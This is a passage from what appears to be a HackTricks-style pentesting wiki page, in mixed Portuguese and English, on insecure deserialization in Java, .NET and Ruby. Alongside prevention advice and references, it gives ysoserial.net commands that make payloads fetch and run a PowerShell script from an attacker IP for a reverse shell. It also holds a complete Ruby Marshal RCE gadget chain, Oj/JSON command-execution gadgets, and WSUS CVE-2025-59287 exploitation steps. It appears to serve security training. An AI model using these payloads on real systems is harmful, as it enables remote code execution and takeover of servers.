Confira um exemplo em [rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

**Implementando filtros de serialização**: Java 9 introduziu filtros de serialização por meio da interface **`ObjectInputFilter`**, fornecendo um mecanismo poderoso para especificar critérios que objetos serializados devem atender antes de serem desserializados. Esses filtros podem ser aplicados globalmente ou por stream, oferecendo controle granular sobre o processo de desserialização.

Para utilizar filtros de serialização, você pode definir um filtro global que se aplica a todas as operações de desserialização ou configurá-lo dinamicamente para streams específicos. Por exemplo:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**Leveraging External Libraries for Enhanced Security**: Libraries such as **NotSoSerial**, **jdeserialize**, and **Kryo** offer advanced features for controlling and monitoring Java deserialization. These libraries can provide additional layers of security, such as whitelisting or blacklisting classes, analyzing serialized objects before deserialization, and implementing custom serialization strategies.

- **NotSoSerial** intercepts deserialization processes to prevent execution of untrusted code.
- **jdeserialize** allows for the analysis of serialized Java objects without deserializing them, helping identify potentially malicious content.
- **Kryo** is an alternative serialization framework that emphasizes speed and efficiency, offering configurable serialization strategies that can enhance security.

### References

- [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- Deserialization and ysoserial talk: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
- [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
- [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
- Talk about gadgetinspector: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) and slides: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
- Marshalsec paper: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
- [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
- [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
- [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
- Java and .Net JSON deserialization **paper:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** talk: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) and slides: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- Deserialziations CVEs: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI Injection & log4Shell

Find whats is **JNDI Injection, how to abuse it via RMI, CORBA & LDAP and how to exploit log4shell** (and example of this vuln) in the following page:


{{#ref}}
jndi-java-naming-and-directory-interface-and-log4shell.md
{{#endref}}

## JMS - Java Message Service

> The **Java Message Service** (**JMS**) API is a Java message-oriented middleware API for sending messages between two or more clients. It is an implementation to handle the producer–consumer problem. JMS is a part of the Java Platform, Enterprise Edition (Java EE), and was defined by a specification developed at Sun Microsystems, but which has since been guided by the Java Community Process. It is a messaging standard that allows application components based on Java EE to create, send, receive, and read messages. It allows the communication between different components of a distributed application to be loosely coupled, reliable, and asynchronous. (From [Wikipedia](https://en.wikipedia.org/wiki/Java_Message_Service)).

### Products

There are several products using this middleware to send messages:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../images/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../images/image (1056).png>)

### Exploitation

So, basically there are a **bunch of services using JMS on a dangerous way**. Therefore, if you have **enough privileges** to send messages to this services (usually you will need valid credentials) you could be able to send **malicious objects serialized that will be deserialized by the consumer/subscriber**.\
This means that in this exploitation all the **clients that are going to use that message will get infected**.

You should remember that even if a service is vulnerable (because it's insecurely deserializing user input) you still need to find valid gadgets to exploit the vulnerability.

The tool [JMET](https://github.com/matthiaskaiser/jmet) was created to **connect and attack this services sending several malicious objects serialized using known gadgets**. These exploits will work if the service is still vulnerable and if any of the used gadgets is inside the vulnerable application.

### References

- [Patchstack advisory – Everest Forms unauthenticated PHP Object Injection (CVE-2025-52709)](https://patchstack.com/articles/critical-vulnerability-impacting-over-100k-sites-patched-in-everest-forms-plugin/)

- JMET talk: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
- Slides: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

In the context of .Net, deserialization exploits operate in a manner akin to those found in Java, where gadgets are exploited to run specific code during the deserialization of an object.

### Fingerprint

#### WhiteBox

The source code should be inspected for occurrences of:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

The focus should be on serializers that permit the type to be determined by a variable under user control.

#### BlackBox

The search should target the Base64 encoded string **AAEAAAD/////** or any similar pattern that might undergo deserialization on the server-side, granting control over the type to be deserialized. This could include, but is not limited to, **JSON** or **XML** structures featuring `TypeObject` or `$type`.

### ysoserial.net

In this case you can use the tool [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) in order to **create the deserialization exploits**. Once downloaded the git repository you should **compile the tool** using Visual Studio for example.

If you want to learn about **how does ysoserial.net creates it's exploit** you can [**check this page where is explained the ObjectDataProvider gadget + ExpandedWrapper + Json.Net formatter**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

The main options of **ysoserial.net** are: **`--gadget`**, **`--formatter`**, **`--output`** and **`--plugin`.**

- **`--gadget`** used to indicate the gadget to abuse (indicate the class/function that will be abused during deserialization to execute commands).
- **`--formatter`**, used to indicated the method to serialized the exploit (you need to know which library is using the back-end to deserialize the payload and use the same to serialize it)
- **`--output`** used to indicate if you want the exploit in **raw** or **base64** encoded. _Note that **ysoserial.net** will **encode** the payload using **UTF-16LE** (encoding used by default on Windows) so if you get the raw and just encode it from a linux console you might have some **encoding compatibility problems** that will prevent the exploit from working properly (in HTB JSON box the payload worked in both UTF-16LE and ASCII but this doesn't mean it will always work)._
- **`--plugin`** ysoserial.net supports plugins to craft **exploits for specific frameworks** like ViewState

#### More ysoserial.net parameters

- `--minify` will provide a **smaller payload** (if possible)
- `--raf -f Json.Net -c "anything"` This will indicate all the gadgets that can be used with a provided formatter (`Json.Net` in this case)
- `--sf xml` you can **indicate a gadget** (`-g`)and ysoserial.net will search for formatters containing "xml" (case insensitive)

**ysoserial examples** to create exploits:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** também tem um parâmetro **muito interessante** que ajuda a entender melhor como cada exploit funciona: `--test`\
Se você indicar esse parâmetro **ysoserial.net** irá **tentar** o **exploit localmente,** assim você pode testar se seu payload funcionará corretamente.\
Esse parâmetro é útil porque se você revisar o código encontrará trechos de código como o seguinte (de [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
Isso significa que, para testar o exploit, o código chamará [serializersHelper.JsonNet_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539)
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
In the **código anterior é vulnerável ao exploit criado**. Portanto, se você encontrar algo semelhante em uma aplicação .Net, isso provavelmente significa que essa aplicação também é vulnerável.\
Portanto o parâmetro **`--test`** nos permite entender **quais trechos de código são vulneráveis** ao exploit de desserialização que **ysoserial.net** pode criar.

### ViewState

Dê uma olhada neste POST sobre [**como tentar explorar o parâmetro \_\_ViewState do .Net**](exploiting-__viewstate-parameter.md) para **executar código arbitrário.** Se você **já conhece os segredos** usados pela máquina vítima, [**leia este post para saber como executar código**](exploiting-__viewstate-knowing-the-secret.md).

### Real‑world sink: WSUS AuthorizationCookie & Reporting SOAP → BinaryFormatter/SoapFormatter RCE

- Endpoints afetados:
- `/SimpleAuthWebService/SimpleAuth.asmx` → GetCookie() AuthorizationCookie é descriptografado e então desserializado com BinaryFormatter.
- `/ReportingWebService.asmx` → ReportEventBatch e operações SOAP relacionadas que atingem sinks do SoapFormatter; o gadget base64 é processado quando o console WSUS ingere o evento.
- Causa raiz: bytes controlados pelo atacante chegam aos formatadores legados do .NET (BinaryFormatter/SoapFormatter) sem allow‑lists/binders estritos, então as cadeias de gadgets executam como a conta de serviço do WSUS (frequentemente SYSTEM).

Exploração mínima (caminho Reporting):
1) Gere um gadget .NET com ysoserial.net (BinaryFormatter ou SoapFormatter) e produza saída em base64, por exemplo:
```powershell
# Reverse shell (EncodedCommand) via BinaryFormatter
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -o base64 -c "powershell -NoP -W Hidden -Enc <BASE64_PS>"

# Simple calc via SoapFormatter (test)
ysoserial.exe -g TypeConfuseDelegate -f SoapFormatter -o base64 -c "calc.exe"
```
2) Crie um SOAP para `ReportEventBatch` incorporando o gadget base64 e dê um POST para `/ReportingWebService.asmx`.
3) Quando um admin abre o console do WSUS, o evento é desserializado e o gadget dispara (RCE como SYSTEM).

AuthorizationCookie / GetCookie()
- Uma AuthorizationCookie forjada pode ser aceita, decriptada e passada para um BinaryFormatter sink, permitindo pre‑auth RCE se acessível.

Parâmetros do PoC público (tecxx/CVE-2025-59287-WSUS):
```powershell
$lhost = "192.168.49.51"
$lport = 53
$targetURL = "http://192.168.51.89:8530"
```
Veja [Windows Local Privilege Escalation – WSUS](../../windows-hardening/windows-local-privilege-escalation/README.md)

### Prevenção

Para mitigar os riscos associados à deserialização em .Net:

- **Evite permitir que streams de dados definam seus tipos de objeto.** Utilize `DataContractSerializer` ou `XmlSerializer` quando possível.
- **Para `JSON.Net`, defina `TypeNameHandling` como `None`:** `TypeNameHandling = TypeNameHandling.None`
- **Evite usar `JavaScriptSerializer` com um `JavaScriptTypeResolver`.**
- **Limite os tipos que podem ser desserializados**, entendendo os riscos inerentes aos tipos .Net, como `System.IO.FileInfo`, que pode modificar propriedades de arquivos no servidor, potencialmente levando a ataques de negação de serviço.
- **Tenha cautela com tipos que possuem propriedades arriscadas**, como `System.ComponentModel.DataAnnotations.ValidationException` com sua propriedade `Value`, que pode ser explorada.
- **Controle de forma segura a instanciação de tipos** para impedir que atacantes influenciem o processo de desserialização, tornando até mesmo `DataContractSerializer` ou `XmlSerializer` vulneráveis.
- **Implemente controles de white list** usando um `SerializationBinder` customizado para `BinaryFormatter` e `JSON.Net`.
- **Mantenha-se informado sobre gadgets de desserialização inseguros conhecidos** dentro do .Net e assegure que desserializadores não instanciem tais tipos.
- **Isole código potencialmente arriscado** do código com acesso à internet para evitar expor gadgets conhecidos, como `System.Windows.Data.ObjectDataProvider` em aplicações WPF, a fontes de dados não confiáveis.

### **Referências**

- Java and .Net JSON deserialization **artigo:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** palestra: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) e slides: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp)
- [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)
- [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

Em Ruby, a serialização é facilitada por dois métodos dentro da biblioteca **marshal**. O primeiro método, conhecido como **dump**, é usado para transformar um objeto em um fluxo de bytes. Esse processo é referido como serialização. Por outro lado, o segundo método, **load**, é empregado para reverter um fluxo de bytes de volta a um objeto, um processo conhecido como desserialização.

Para proteger objetos serializados, **Ruby emprega HMAC (Hash-Based Message Authentication Code)**, garantindo a integridade e autenticidade dos dados. A chave utilizada para esse propósito é armazenada em um dos vários locais possíveis:

- `config/environment.rb`
- `config/initializers/secret_token.rb`
- `config/secrets.yml`
- `/proc/self/environ`

**Ruby 2.X generic deserialization to RCE gadget chain (mais informações em** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**):**
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Outra cadeia de RCE para explorar Ruby On Rails: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

### Método .send() do Ruby

Como explicado em [**this vulnerability report**](https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/), se alguma entrada do usuário não sanitizada alcançar o método `.send()` de um objeto ruby, esse método permite **invocar qualquer outro método** do objeto com quaisquer parâmetros.

Por exemplo, chamar eval e então código ruby como segundo parâmetro permitirá executar código arbitrário:
```ruby
<Object>.send('eval', '<user input with Ruby code>') == RCE
```
Além disso, se apenas um parâmetro de **`.send()`** for controlado por um atacante, como mencionado no writeup anterior, é possível chamar qualquer método do objeto que **não precise de argumentos** ou cujos argumentos tenham **valores padrão**.\
Para isso, é possível enumerar todos os métodos do objeto para **encontrar alguns métodos interessantes que cumpram esses requisitos**.
```ruby
<Object>.send('<user_input>')

# This code is taken from the original blog post
# <Object> in this case is Repository
## Find methods with those requirements
repo = Repository.find(1)  # get first repo
repo_methods = [           # get names of all methods accessible by Repository object
repo.public_methods(),
repo.private_methods(),
repo.protected_methods(),
].flatten()

repo_methods.length()      # Initial number of methods => 5542

## Filter by the arguments requirements
candidate_methods = repo_methods.select() do |method_name|
[0, -1].include?(repo.method(method_name).arity())
end
candidate_methods.length() # Final number of methods=> 3595
```
### Ruby class pollution

Verifique como pode ser possível [pollute a Ruby class and abuse it in here](ruby-class-pollution.md).

### Ruby _json pollution

Ao enviar no corpo alguns valores não hashabled como um array, eles serão adicionados a uma nova chave chamada `_json`. No entanto, é possível que um atacante também defina no corpo um valor chamado `_json` com os valores arbitrários que desejar. Então, se o backend, por exemplo, verificar a veracidade de um parâmetro mas também usar o parâmetro `_json` para executar alguma ação, pode ocorrer um bypass de autorização.

Confira mais informações na [Ruby _json pollution page](ruby-_json-pollution.md).

### Outras bibliotecas

Esta técnica foi retirada[ **from this blog post**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared).

Existem outras bibliotecas Ruby que podem ser usadas para serializar objetos e que, portanto, poderiam ser abusadas para obter RCE durante uma deserialização insegura. A tabela a seguir mostra algumas dessas bibliotecas e o método que é chamado da classe carregada sempre que ela é desserializada (função para abusar para obter RCE basicamente):

<table data-header-hidden><thead><tr><th width="179"></th><th width="146"></th><th></th></tr></thead><tbody><tr><td><strong>Biblioteca</strong></td><td><strong>Dados de entrada</strong></td><td><strong>Método disparador dentro da classe</strong></td></tr><tr><td>Marshal (Ruby)</td><td>Binary</td><td><code>_load</code></td></tr><tr><td>Oj</td><td>JSON</td><td><code>hash</code> (class needs to be put into hash(map) as key)</td></tr><tr><td>Ox</td><td>XML</td><td><code>hash</code> (class needs to be put into hash(map) as key)</td></tr><tr><td>Psych (Ruby)</td><td>YAML</td><td><code>hash</code> (class needs to be put into hash(map) as key)<br><code>init_with</code></td></tr><tr><td>JSON (Ruby)</td><td>JSON</td><td><code>json_create</code> ([see notes regarding json_create at end](#table-vulnerable-sinks))</td></tr></tbody></table>

Exemplo básico:
```ruby
# Existing Ruby class inside the code of the app
class SimpleClass
def initialize(cmd)
@cmd = cmd
end

def hash
system(@cmd)
end
end

# Exploit
require 'oj'
simple = SimpleClass.new("open -a calculator") # command for macOS
json_payload = Oj.dump(simple)
puts json_payload

# Sink vulnerable inside the code accepting user input as json_payload
Oj.load(json_payload)
```
No caso de tentar abusar do Oj, foi possível encontrar uma gadget class que, dentro da sua função `hash`, chama `to_s`, que chama spec, que chama fetch_path, o que permitia fazê-la buscar uma URL arbitrária, servindo como um ótimo detector desse tipo de unsanitized deserialization vulnerabilities.
```json
{
"^o": "URI::HTTP",
"scheme": "s3",
"host": "example.org/anyurl?",
"port": "anyport",
"path": "/",
"user": "anyuser",
"password": "anypw"
}
```
Além disso, verificou-se que, com a técnica anterior, uma pasta também é criada no sistema, o que é um requisito para abusar de outro gadget a fim de transformar isso em uma RCE completa com algo como:
```json
{
"^o": "Gem::Resolver::SpecSpecification",
"spec": {
"^o": "Gem::Resolver::GitSpecification",
"source": {
"^o": "Gem::Source::Git",
"git": "zip",
"reference": "-TmTT=\"$(id>/tmp/anyexec)\"",
"root_dir": "/tmp",
"repository": "anyrepo",
"name": "anyname"
},
"spec": {
"^o": "Gem::Resolver::Specification",
"name": "name",
"dependencies": []
}
}
}
```
Check for more details in the [**original post**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared).

### Cache do Bootsnap

Não é exatamente uma vuln de deserialização, mas um truque interessante para abusar do caching do Bootsnap e obter RCE a partir de um arbitrary file write em uma aplicação Rails (encontre o post completo [original post in here](https://blog.convisoappsec.com/en/from-arbitrary-file-write-to-rce-in-restricted-rails-apps/)).

Abaixo segue um resumo curto dos passos detalhados no artigo para explorar uma vulnerabilidade de arbitrary file write abusando do cache do Bootsnap:

- Identificar a Vulnerabilidade e o Ambiente

A funcionalidade de upload de arquivos da app Rails permite que um atacante escreva arquivos arbitrariamente. Embora a app rode com restrições (apenas certos diretórios como tmp são graváveis devido ao usuário non-root do Docker), isso ainda permite escrever no diretório de cache do Bootsnap (tipicamente em tmp/cache/bootsnap).

- Entender o Mecanismo de Cache do Bootsnap

Bootsnap acelera o boot do Rails cacheando código Ruby compilado, YAML e JSON. Ele armazena arquivos de cache que incluem um cabeçalho de cache key (com campos como Ruby version, file size, mtime, compile options, etc.) seguido pelo código compilado. Esse cabeçalho é usado para validar o cache durante o startup da app.

- Coletar Metadados do Arquivo

O atacante primeiro seleciona um arquivo alvo que provavelmente é carregado durante o startup do Rails (por exemplo, set.rb da standard library do Ruby). Executando código Ruby dentro do container, ele extrai metadados críticos (tais como RUBY_VERSION, RUBY_REVISION, size, mtime, e compile_option). Esses dados são essenciais para construir uma cache key válida.

- Calcular o Caminho do Arquivo de Cache

Ao replicar o mecanismo de hash FNV-1a 64-bit do Bootsnap, determina-se o caminho correto do arquivo de cache. Esse passo garante que o arquivo de cache malicioso seja colocado exatamente onde o Bootsnap espera (por exemplo, sob tmp/cache/bootsnap/compile-cache-iseq/).

- Construir o Arquivo de Cache Malicioso

O atacante prepara um payload que:

- Executa comandos arbitrários (por exemplo, executar id para mostrar informações do processo).
- Remove o cache malicioso após a execução para evitar exploração recursiva.
- Carrega o arquivo original (por exemplo, set.rb) para evitar que a aplicação quebre.

Esse payload é compilado em código Ruby binário e concatenado com um cabeçalho de cache key cuidadosamente construído (usando os metadados previamente coletados e o número de versão correto do Bootsnap).

- Sobrescrever e Acionar a Execução

Usando a vulnerabilidade de arbitrary file write, o atacante escreve o arquivo de cache craftado no local calculado. Em seguida, ele aciona um restart do servidor (escrevendo em tmp/restart.txt, que é monitorado pelo Puma). Durante o restart, quando o Rails requer o arquivo alvo, o arquivo de cache malicioso é carregado, resultando em remote code execution (RCE).



### Exploração do Ruby Marshal na prática (atualizado)

Trate qualquer fluxo onde bytes não confiáveis alcancem `Marshal.load`/`marshal_load` como um sink de RCE. Marshal reconstrói grafos de objetos arbitrários e dispara callbacks de libraries/gems durante a materialização.


- Caminho de código mínimo vulnerável no Rails:
```ruby
class UserRestoreController < ApplicationController
def show
user_data = params[:data]
if user_data.present?
deserialized_user = Marshal.load(Base64.decode64(user_data))
render plain: "OK: #{deserialized_user.inspect}"
else
render plain: "No data", status: :bad_request
end
end
end
```
- Classes de gadget comuns observadas em chains reais: `Gem::SpecFetcher`, `Gem::Version`, `Gem::RequestSet::Lockfile`, `Gem::Resolver::GitSpecification`, `Gem::Source::Git`.
- Marcador típico de efeito colateral embutido em payloads (executado durante unmarshal):
```
*-TmTT="$(id>/tmp/marshal-poc)"any.zip
```
Onde isso aparece em aplicações reais:
- Armazenamentos de cache do Rails e armazenamentos de sessão historicamente usando Marshal
- Backends de background job e stores de objetos baseados em arquivo
- Qualquer persistência personalizada ou transporte de blobs binários de objetos

Descoberta industrializada de gadgets:
- Grep por construtores, `hash`, `_load`, `init_with`, ou métodos com efeitos colaterais invocados durante o unmarshal
- Use CodeQL’s Ruby unsafe deserialization queries to trace sources → sinks and surface gadgets
- Valide com PoCs públicas multi-formato (JSON/XML/YAML/Marshal)


## Referências

- Trail of Bits – Marshal madness: A brief history of Ruby deserialization exploits: https://blog.trailofbits.com/2025/08/20/marshal-madness-a-brief-history-of-ruby-deserialization-exploits/
- elttam – Ruby 2.x Universal RCE Deserialization Gadget Chain: https://www.elttam.com/blog/ruby-deserialization/
- Phrack #69 – Rails 3/4 Marshal chain: https://phrack.org/issues/69/12.html
- CVE-2019-5420 (Rails 5.2 insecure deserialization): https://nvd.nist.gov/vuln/detail/CVE-2019-5420
- ZDI – RCE via Ruby on Rails Active Storage insecure deserialization: https://www.zerodayinitiative.com/blog/2019/6/20/remote-code-execution-via-ruby-on-rails-active-storage-insecure-deserialization
- Include Security – Discovering gadget chains in Rubyland: https://blog.includesecurity.com/2024/03/discovering-deserialization-gadget-chains-in-rubyland/
- GitHub Security Lab – Ruby unsafe deserialization (query help): https://codeql.github.com/codeql-query-help/ruby/rb-unsafe-deserialization/
- GitHub Security Lab – PoCs repo: https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization
- Doyensec PR – Ruby 3.4 gadget: https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization/pull/1
- Luke Jahnke – Ruby 3.4 universal chain: https://nastystereo.com/security/ruby-3.4-deserialization.html
- Luke Jahnke – Gem::SafeMarshal escape: https://nastystereo.com/security/ruby-safe-marshal-escape.html
- Ruby 3.4.0-rc1 release: https://github.com/ruby/ruby/releases/tag/v3_4_0_rc1
- Ruby fix PR #12444: https://github.com/ruby/ruby/pull/12444
- Trail of Bits – Auditing RubyGems.org (Marshal findings): https://blog.trailofbits.com/2024/12/11/auditing-the-ruby-ecosystems-central-package-repository/
- watchTowr Labs – Is This Bad? This Feels Bad — GoAnywhere CVE-2025-10035: https://labs.watchtowr.com/is-this-bad-this-feels-bad-goanywhere-cve-2025-10035/
- [OffSec – CVE-2025-59287 WSUS unsafe deserialization (blog)](https://www.offsec.com/blog/recent-vulnerabilities-in-redis-servers-lua-scripting-engine-2/)
- [PoC – tecxx/CVE-2025-59287-WSUS](https://github.com/tecxx/CVE-2025-59287-WSUS)

{{#include ../../banners/hacktricks-training.md}}
